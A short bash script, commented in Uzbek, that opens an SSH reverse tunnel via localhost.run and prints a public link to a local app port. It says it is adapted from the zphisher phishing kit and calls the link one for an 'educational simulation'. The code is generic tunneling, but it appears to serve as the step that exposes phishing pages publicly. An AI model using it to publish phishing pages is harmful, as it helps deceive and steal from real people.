#!/usr/bin/env bash
# Localhost.run SSH tunnel (zphisher start_local dan — faqat havola qismi)

source "$(dirname "$0")/lib.sh"

stop_tunnel
mkdir -p "$DATA_DIR"

if ! command -v ssh >/dev/null 2>&1; then
  error "SSH o'rnatilmagan. O'rnating: pkg install openssh"
fi

info "Localhost.run tunnel (port $APP_PORT)..."
rm -f "$LINK_FILE"

# zphisher: ssh -R 80:localhost:PORT ssh.localhost.run
timeout 25 ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 \
  -R "80:localhost:${APP_PORT}" ssh.localhost.run > "$LINK_FILE" 2>&1 &
ssh_pid=$!
echo $ssh_pid > "$TUNNEL_PID_FILE"

sleep 12

LINK=$(grep -oE 'https://[0-9a-zA-Z.-]+\.localhost\.run' "$LINK_FILE" 2>/dev/null | head -n1 || true)
if [ -z "$LINK" ]; then
  LINK=$(grep -oE 'https://[^ ]+\.localhost\.run' "$LINK_FILE" 2>/dev/null | head -n1 || true)
fi
if [ -z "$LINK" ]; then
  LINK=$(grep -oE 'https://[^ ]+' "$LINK_FILE" 2>/dev/null | grep -v github | head -n1 || true)
fi

if [ -z "$LINK" ]; then
  warn "Localhost.run havolasi olinmadi."
  cat "$LINK_FILE" 2>/dev/null || true
  kill "$ssh_pid" 2>/dev/null || true
  exit 1
fi

save_public_url "$LINK" "localhostrun"
echo ""
ok "Ta'lim simulyatsiyasi uchun ommaviy havola (Localhost.run):"
echo -e "  \033[1;93m$LINK\033[0m"
info "Tunnel fon rejimida ishlayapti (PID: $ssh_pid)"
